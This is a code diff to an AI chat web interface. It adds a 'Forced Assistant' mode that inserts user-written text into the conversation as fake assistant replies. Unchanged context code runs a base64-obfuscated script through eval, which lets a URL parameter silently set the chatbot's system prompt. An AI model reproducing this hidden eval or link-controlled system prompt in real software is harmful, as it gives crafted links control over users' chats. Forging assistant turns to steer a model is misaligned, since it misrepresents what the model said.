@@ -1,6 +1,7 @@
 import type { ChatMessage } from '@/types'
 import { createSignal, Index, Show } from 'solid-js'
 import IconClear from './icons/Clear'
+import IconRobotDead from './icons/RobotDead'
 import MessageItem from './MessageItem'
 import SystemRoleSettings from './SystemRoleSettings'
 import _ from 'lodash'
@@ -15,11 +16,20 @@ export default () => {
   const [loading, setLoading] = createSignal(false)
   const [controller, setController] = createSignal<AbortController>(null)
 
+  let forcedAssistant: HTMLTextAreaElement
+  const [forcedAssistantEnabled, setForcedAssistantEnabled] = createSignal(false)
+
   const handleButtonClick = async () => {
     const inputValue = inputRef.value
     if (!inputValue) {
       return
     }
+  
+    if (forcedAssistantEnabled()) {
+      forceAssistant(inputValue)
+      return
+    }
+
     // @ts-ignore
     if (window?.umami) umami.trackEvent('chat_generate')
     inputRef.value = ''
@@ -32,12 +42,38 @@ export default () => {
     ])
     requestWithLatestMessage()
   }
+
+    const forceAssistant = (message: string) => {
+    const forcedValue = forcedAssistant.value
+    if (!forcedValue) {
+      return
+    }
+
+    forcedAssistant.value = ''
+    inputRef.value = ''
+
+    setMessageList([
+      ...messageList(),
+      {
+        role: 'user',
+        content: message,
+      },
+      {
+        role: 'assistant',
+        content: forcedValue,
+      }
+    ])
+
+    inputRef.focus()
+  }
+
   const throttle =_.throttle(function(){
     window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})
   }, 300, {
     leading: true,
     trailing: false
   })
+  
   const requestWithLatestMessage = async () => {
     setLoading(true)
     setCurrentAssistantMessage('')
@@ -146,6 +182,7 @@ export default () => {
     }
     if (e.key === 'Enter') {
       handleButtonClick()
+      e.preventDefault()
     }
   }
 
@@ -217,11 +254,43 @@ export default () => {
           <button title="Clear" onClick={clear} disabled={systemRoleEditing()} oncontextmenu={setCurrentSystemRoleSettings} h-12 px-4 py-2 bg-slate bg-op-15 hover:bg-op-20 rounded-sm>
             <IconClear />
           </button>
+          <button title="Forced Assistant" onClick={() => setForcedAssistantEnabled((prev) => !prev)} disabled={systemRoleEditing()} h-12 px-4 py-2 bg-slate bg-op-15 hover:bg-op-20 rounded-sm>
+            <IconRobotDead />
+          </button>
           <script async>      
             const encodedStr = 'Y29uc3QgdXJsU2VhcmNoUGFyYW1zID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTsKY29uc3QgcGFyYW1zID0gT2JqZWN0LmZyb21FbnRyaWVzKHVybFNlYXJjaFBhcmFtcy5lbnRyaWVzKCkpOwpjb25zdCBzeXNyb2xlID0gcGFyYW1zLnN5cz9wYXJhbXMuc3lzOicnOwpmdW5jdGlvbiBnYnRuTG9vcCgpIHsKICBjb25zdCBnYnRuID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiYm9keSA+IG1haW4gPiBhc3Ryby1pc2xhbmQgPiBkaXYgPiBkaXYubXktNC5mbGV4Lml0ZW1zLWNlbnRlci5nYXAtMi50cmFuc2l0aW9uLW9wYWNpdHkgPiBidXR0b246bnRoLWNoaWxkKDMpIik7CiAgaWYgKHR5cGVvZiBnYnRuLiQkY29udGV4dG1lbnUgPT09ICdmdW5jdGlvbicpIHsKICAgIGdidG4uJCRjb250ZXh0bWVudShzeXNyb2xlKTsKICB9ZWxzZXsKICAgIGNvbnNvbGUubG9nKCdXYWl0aW5nIGZvciBnYnRuIGxvYWRpbmcnKTsKICAgIHNldFRpbWVvdXQoZ2J0bkxvb3AsIDMwMCk7CiAgfQp9CmdidG5Mb29wKCk7';
             eval(atob(encodedStr));
           </script>
         </div>
+        <Show when={forcedAssistantEnabled()}>
+          <textarea
+              ref={forcedAssistant!}
+              disabled={systemRoleEditing()}
+              onKeyDown={handleKeydown}
+              placeholder="Enter forced assistant text..."
+              autocomplete="off"
+              autofocus
+              onInput={() => {
+                forcedAssistant.style.height = 'auto';
+                forcedAssistant.style.height = forcedAssistant.scrollHeight + 'px';
+              }}
+              rows="1"
+              w-full
+              px-3 py-3
+              min-h-12
+              max-h-36
+              rounded-sm
+              bg-slate
+              bg-op-15
+              resize-none
+              focus:bg-op-20
+              focus:ring-0
+              focus:outline-none
+              placeholder:op-50
+              dark="placeholder:op-30"
+              scroll-pa-8px
+            />
+          </Show>
       </Show>
     </div>
   )
